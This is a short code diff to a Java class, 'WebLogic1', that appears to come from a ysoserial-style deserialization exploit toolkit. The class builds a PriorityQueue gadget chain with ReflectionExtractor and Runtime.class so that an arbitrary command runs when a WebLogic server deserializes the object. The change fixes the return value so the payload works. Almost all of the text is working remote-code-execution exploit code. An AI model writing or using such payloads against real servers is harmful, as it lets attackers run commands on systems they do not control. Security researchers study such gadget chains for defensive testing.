@@ -16,10 +16,11 @@ import java.lang.reflect.Field;
 import java.util.PriorityQueue;
 
 @PayloadTest( precondition = "isApplicableJavaVersion")
+@Dependencies({"commons-collections:commons-collections:3.1"})
 public class WebLogic1 extends PayloadRunner implements ObjectPayload<Object> {
 
     @Override
-    public Object[] getObject(String command) throws Exception {
+    public PriorityQueue getObject(String command) throws Exception {
         final String[] execArgs = new String[] { command };
         ReflectionExtractor extractor1 = new ReflectionExtractor(
             "getMethod",
@@ -58,8 +59,7 @@ public class WebLogic1 extends PayloadRunner implements ObjectPayload<Object> {
         Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
         queueArray[0] = Runtime.class;
         queueArray[1] = "1";
-        
-        return queueArray;
+        return queue;
     }
     public static void main(final String[] args) throws Exception {
         PayloadRunner.run(WebLogic1.class, args);
